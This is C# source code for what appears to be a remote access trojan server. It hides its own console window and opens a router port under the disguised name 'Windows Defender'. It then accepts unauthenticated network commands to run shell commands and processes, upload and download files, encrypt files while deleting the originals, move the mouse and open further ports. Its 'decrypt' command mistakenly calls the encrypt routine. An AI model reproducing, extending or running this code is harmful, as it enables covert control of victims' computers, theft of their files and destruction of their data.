using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Net;
using System.Text;
using System.Runtime.InteropServices;
using System.IO;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;

namespace Server
{
    class Server
    {
        [DllImport("user32.dll")]
        static extern bool SetCursorPos(int X, int Y);
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        static int port = 12750;
        static bool running;
        static Socket socket;
        static int receiveBuffer = 8192;
        static int sendBuffer = 8192;
        static int receiveTimeout = 30000;
        static int sendTimeout = 30000;

        static void Main(string[] args)
        {

            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

            try
            {
                ShowWindow(GetConsoleWindow(), 0); //0 - invizibil; 5 - vizibil
                Utils.OpenPort(Open.Nat.Protocol.Tcp, port, port, "Windows Defender").Wait();
            }
            catch
            {
                Console.WriteLine($"Failed to open port {port}.");
            }

            socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            socket.Bind(new IPEndPoint(0, port));
            socket.Listen(100);

            running = true;
            while (running)
            {
                Socket accepted = socket.Accept();
                new Thread(() => ProcessRequest(accepted)).Start();
            }
            socket.Shutdown(SocketShutdown.Both);
            socket.Close();
        }

        static void ProcessRequest(Socket accepted)
        {
            accepted.ReceiveBufferSize = receiveBuffer;
            accepted.SendBufferSize = sendBuffer;
            accepted.ReceiveTimeout = receiveTimeout;
            accepted.SendTimeout = sendTimeout;

            NetworkStream networkStream = new NetworkStream(accepted);
            BinaryWriter binaryWriter = new BinaryWriter(networkStream);
            BinaryReader binaryReader = new BinaryReader(networkStream);

            try
            {
                byte[] buffer = new byte[receiveBuffer]; //aici dadea eroare
                binaryReader.Read(buffer);
                buffer = Utils.TrimBytes(buffer);
                string result = Encoding.ASCII.GetString(buffer);
                List<string> commandArgs = Regex.Split(result,
                    "(?<=^[^\"]*(?:\"[^\"]*\"[^\"]*)*) (?=(?:[^\"]*\"[^\"]*\")*[^\"]*$)").ToList();

                //initial try incepea de aici, dar putea sa dea aroare cand astepta primul stream

                //momentan inutil pt ca primul socket nu citeste stream-ul
                if (result == "connected")
                    SendMessage(binaryWriter, "Connection established.");

                //remotereceivebuffer
                else if (commandArgs[0] == "remoteReceiveBuffer")
                {
                    if (commandArgs.Count >= 2 && !String.IsNullOrWhiteSpace(commandArgs[1]))
                    {
                        Int32.TryParse(commandArgs[1], out receiveBuffer);
                        SendMessage(binaryWriter, $"Server receive buffer size set to {receiveBuffer}.");
                    }
                    else
                        SendMessage(binaryWriter, $"Server receive buffer size is {receiveBuffer}.");
                }

                //remotesendbuffer
                else if (commandArgs[0] == "remoteSendBuffer")
                {
                    if (commandArgs.Count >= 2 && !String.IsNullOrWhiteSpace(commandArgs[1]))
                    {
                        Int32.TryParse(commandArgs[1], out sendBuffer);
                        SendMessage(binaryWriter, $"Server send buffer size set to {sendBuffer}.");
                    }
                    else
                        SendMessage(binaryWriter, $"Server send buffer size is {sendBuffer}.");
                }

                //remotereceivetimeout
                else if (commandArgs[0] == "remoteReceiveTimeout")
                {
                    if (commandArgs.Count >= 2 && !String.IsNullOrWhiteSpace(commandArgs[1]))
                    {
                        Int32.TryParse(commandArgs[1], out receiveTimeout);
                        SendMessage(binaryWriter, $"Server send timeout set to {receiveTimeout}.");
                    }
                    else
                        SendMessage(binaryWriter, $"Server send timeout is {receiveTimeout}.");
                }

                //remotesendtimeout
                else if (commandArgs[0] == "remoteSendTimeout")
                {
                    if (commandArgs.Count >= 2 && !String.IsNullOrWhiteSpace(commandArgs[1]))
                    {
                        Int32.TryParse(commandArgs[1], out sendTimeout);
                        SendMessage(binaryWriter, $"Server send timeout set to {sendTimeout}.");
                    }
                    else
                        SendMessage(binaryWriter, $"Server send timeout is {sendTimeout}.");
                }

                //send
                else if (commandArgs[0] == "send")
                {
                    byte[] fileBytes = new byte[receiveBuffer];
                    binaryReader.Read(fileBytes);

                    File.WriteAllBytes(commandArgs[2].Trim('"'), Utils.TrimBytes(fileBytes));

                    SendMessage(binaryWriter, $"Successfully sent file {commandArgs[2]}.");
                }

                //receive
                else if (commandArgs[0] == "receive")
                {
                    Thread.Sleep(1000); //nu stiu dc, dar fara asta nu merge

                    byte[] fileBytes = File.ReadAllBytes(commandArgs[1].Trim('"'));
                    binaryWriter.Write(fileBytes);
                }

                //beep
                else if (commandArgs[0] == "beep")
                {
                    if (commandArgs.Count == 2)
                        Commands.Beep(Int32.Parse(commandArgs[1]));
                    else if (commandArgs.Count >= 3)
                        Commands.Beep(Int32.Parse(commandArgs[1]), Int32.Parse(commandArgs[2]));
                    else
                        Commands.Beep();
                    SendMessage(binaryWriter, "Beep executed successfully.");
                }

                //process
                else if (commandArgs[0] == "process")
                {
                    int processId = Commands.StartProcess(commandArgs[1], commandArgs.Skip(2).ToArray());
                    SendMessage(binaryWriter, $"Successfully started process with PID {processId}.");
                }

                //cmd
                else if (commandArgs[0] == "cmd")
                {
                    string output = Commands.ExecuteCMD(commandArgs.Skip(1).ToArray());
                    SendMessage(binaryWriter, $"OUTPUT: {output}");
                    output = null; //salveaza ram
                    GC.Collect();
                }

                //encrypt
                else if (commandArgs[0] == "encrypt")
                {
                    if (commandArgs.Count >= 4)
                    {
                        //ca sa aiba 8 biti
                        string actualPassword = Utils.GetMD5(commandArgs[3]).Substring(0, 8);
                        Commands.EncryptFile(commandArgs[1], commandArgs[2], actualPassword);
                        File.Delete(commandArgs[1]);
                    }
                    SendMessage(binaryWriter, $"Successfully encrypted file '{commandArgs[1]}'" +
                        $"into '{commandArgs[2]}' using password '{commandArgs[3]}'.");
                }

                else if (commandArgs[0] == "decrypt")
                {
                    if (commandArgs.Count >= 4)
                    {
                        //ca sa aiba 8 biti
                        string actualPassword = Utils.GetMD5(commandArgs[3]).Substring(0, 8);
                        Commands.EncryptFile(commandArgs[1], commandArgs[2], actualPassword);
                        File.Delete(commandArgs[1]);
                    }
                    SendMessage(binaryWriter, $"Successfully decrypted file '{commandArgs[1]}'" +
                        $"into '{commandArgs[2]}' using password '{commandArgs[3]}'.");
                }

                //openport
                else if (commandArgs[0] == "openport")
                {
                    if (commandArgs.Count >= 4)
                    {
                        string description = String.Empty;
                        if (commandArgs.Count >= 5)
                            description = commandArgs[4].Trim('"');

                        if (commandArgs[1] == "tcp")
                        {
                            Utils.OpenPort(Open.Nat.Protocol.Tcp, Int32.Parse(commandArgs[2]),
                                Int32.Parse(commandArgs[3]), description).Wait();

                            SendMessage(binaryWriter, $"Successfully opened private port {commandArgs[2]} and " +
                                $"public port {commandArgs[3]} using protocol TCP.");
                        }
                        else if (commandArgs[1] == "udp")
                        {
                            Utils.OpenPort(Open.Nat.Protocol.Udp, Int32.Parse(commandArgs[2]),
                                Int32.Parse(commandArgs[3]), description).Wait();

                            SendMessage(binaryWriter, $"Successfully opened private port {commandArgs[2]} and " +
                                $"public port {commandArgs[3]} using protocol UDP.");
                        }
                        else
                            SendMessage(binaryWriter, $"Invalid protocol; valid protocols are TCP and UDP (lowercase).");
                    }
                    //in caz ca sunt prea putin argumente
                    else
                        throw new IndexOutOfRangeException();
                }

                //mouse
                else if (commandArgs[0] == "mouse")
                {
                    SetCursorPos(Int32.Parse(commandArgs[1]), Int32.Parse(commandArgs[2]));
                    SendMessage(binaryWriter, $"Successfully moved mouse to {commandArgs[1]}, {commandArgs[2]}.");
                }

                else
                    SendMessage(binaryWriter, "Invalid command.");
            }
            catch (Exception e)
            {
                try
                {
                    SendMessage(binaryWriter, $"SERVER ERROR: {e.Message}.");
                }
                catch
                {
                    //sugi pula roby
                }
            }

            networkStream.Close();
            binaryWriter.Close();
            binaryReader.Close();
            accepted.Shutdown(SocketShutdown.Both);
            accepted.Close();
        }

        static void SendMessage(BinaryWriter writer, string input)
        {
            byte[] data = Encoding.ASCII.GetBytes(input);
            writer.Write(data);
        }
    }
}
